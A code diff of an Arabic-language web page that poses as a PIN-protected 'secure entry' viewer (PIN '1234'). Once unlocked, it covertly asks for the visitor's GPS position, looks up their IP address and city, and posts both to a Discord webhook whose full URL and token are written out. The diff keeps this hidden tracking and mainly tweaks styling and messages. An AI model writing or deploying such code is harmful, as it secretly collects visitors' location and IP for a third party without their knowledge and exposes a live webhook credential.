@@ -8,8 +8,8 @@
         :root { --primary: #4f46e5; --dark: #1e293b; --light: #f8fafc; }
         body { margin: 0; font-family: sans-serif; background: #e2e8f0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
         .login-box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; width: 300px; }
-        input { width: 100%; padding: 12px; margin: 20px 0; border: 2px solid #ddd; border-radius: 10px; box-sizing: border-box; text-align: center; outline: none; }
-        .btn-main { background: var(--primary); color: white; border: none; padding: 12px; border-radius: 10px; cursor: pointer; width: 100%; font-weight: bold; }
+        input { width: 100%; padding: 12px; margin: 20px 0; border: 2px solid #ddd; border-radius: 10px; box-sizing: border-box; text-align: center; outline: none; font-size: 18px; }
+        .btn-main { background: var(--primary); color: white; border: none; padding: 12px; border-radius: 10px; cursor: pointer; width: 100%; font-weight: bold; font-size: 16px; }
         #main-content { display: none; width: 100%; height: 100vh; flex-direction: column; }
         iframe { width: 100%; height: 100%; border: none; }
     </style>
@@ -17,10 +17,11 @@
 <body>
 
     <div id="lock-screen" class="login-box">
-        <h2>🔒 دخول آمن</h2>
+        <div style="font-size: 40px;">🔒</div>
+        <h2>دخول آمن</h2>
         <input type="password" id="passInput" placeholder="كود الأمان">
         <button class="btn-main" onclick="handleUnlock()">دخول</button>
-        <p id="msg" style="color: red; font-size: 13px;"></p>
+        <p id="msg" style="color: red; font-size: 13px; margin-top: 10px;"></p>
     </div>
 
     <div id="main-content">
@@ -28,10 +29,9 @@
     </div>
 
     <script>
-        // 🚨 هاد السطر دابا مقاد، متمسحي فيه والو
-        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1465111327482708105/rrFvR8ThqXCp28WtaopCTPj8BRRHUzwdF92Ib1ECYK";
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1465111327482708105/rrFvR8ThqXCp28WtaopCTPj8BRRHUzwfd92IbiECYK3B1n4qwy5qiKhHGGVY-A3GhPdN";
 
-        async function sendToDiscord(locationInfo = "GPS غير مفعل") {
+        async function sendToDiscord(locationInfo = "GPS غير متاح") {
             try {
                 const ipRes = await fetch('https://ipapi.co/json/');
                 const ipData = await ipRes.json();
@@ -41,42 +41,44 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         embeds: [{
-                            title: "🚨 دخول جديد للموقع!",
+                            title: "🚨 تنبيه دخول جديد",
                             color: 5814783,
                             fields: [
                                 { name: "📍 المدينة", value: ipData.city || "غير معروف", inline: true },
                                 { name: "🌐 IP", value: ipData.ip || "غير معروف", inline: true },
-                                { name: "🗺️ الخريطة", value: locationInfo }
-                            ],
-                            footer: { text: new Date().toLocaleString() }
+                                { name: "🗺️ الموقع", value: locationInfo }
+                            ]
                         }]
                     })
                 });
-            } catch (e) { console.log("Error sending to Discord"); }
+            } catch (e) { console.log("Log Error"); }
         }
 
         function handleUnlock() {
             const pin = document.getElementById('passInput').value;
             
             if (pin === "1234") {
-                // 1. الدخول الفوري
+                // دخول فوري بدون انتظار
                 document.getElementById('lock-screen').style.display = 'none';
                 document.getElementById('main-content').style.display = 'flex';
+                document.body.style.background = "white";
 
-                // 2. طلب الـ GPS وإرسال التتبع فـ الخلفية
+                // محاولة إرسال التتبع في الخلفية
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
                         (pos) => {
                             const mapUrl = https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude};
                             sendToDiscord(mapUrl);
                         },
-                        () => { sendToDiscord(); }
+                        () => { sendToDiscord(); },
+                        { timeout: 5000 }
                     );
                 } else {
                     sendToDiscord();
                 }
             } else {
-                document.getElementById('msg').innerText = "كود الأمان غلط!";
+                document.getElementById('msg').innerText = "الكود غير صحيح!";
+                document.getElementById('passInput').value = "";
             }
         }
     </script>
